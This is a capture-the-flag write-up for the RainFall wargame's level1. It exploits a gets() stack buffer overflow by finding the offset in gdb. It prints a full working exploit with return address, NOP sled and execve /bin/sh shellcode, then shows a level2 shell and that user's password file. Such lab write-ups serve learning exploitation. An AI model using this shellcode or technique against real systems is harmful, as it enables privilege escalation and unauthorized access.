For the level1, we have a basic binery.
He just read on the standard input with gets.

When I try to compile a basic file with gets for my test.
The compilateur tel me: 
./a.out
warning: this program uses gets(), which is unsafe.

Ok so why is unsafe? After research we learn the function does not know the size of the buffer.
So it keeps reading until it finds a new line or a EOF.

We can exploit this vulnerability with an buffer overflow for run a shell with level2 permission.

First we need to know how many character he take before crash.

So we take a long string like this:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

And with gdb let's crash ./level1

(gdb) r
Starting program: /home/user/level1/level1
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

0x63413563 = 63 41 35 63 = (in ascii) c A 5 c, is in little Endien so if i reverse this c5Ac.

In my long string 'c5Ac' Start at the 76th character 

Ok, So if i send 76 char, the next char is in esp.

Now we have to find the last address of esp.

(gdb) info frame
Stack level 0, frame at 0xbffff714:
 eip = 0x41414141; saved eip 0x41414141
 called by frame at 0xbffff718
 Arglist at 0xbffff70c, args:
 Locals at 0xbffff70c, Previous frame's sp is 0xbffff714
 Saved registers:
  eip at 0xbffff710

So we need a new address for esp, 0xbffff710 + 4 = 0xbffff714.

Now we need a shellcode for run un shell
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`

To make sure that our exploit doesnâ€™t fail, we add a NOP.
If we don't point on the right address, we find a NOP and keeps executing them (does nothing) 
until it reaches the shellcode.


level1@RainFall:~$ python -c 'print "A" * 76 + "\x14\xf7\xff\xbf" + "\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./level1 "/home/user/level2/.pass"
$ whoami
level2
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


Source: https://0xrick.github.io/binary-exploitation/bof5/
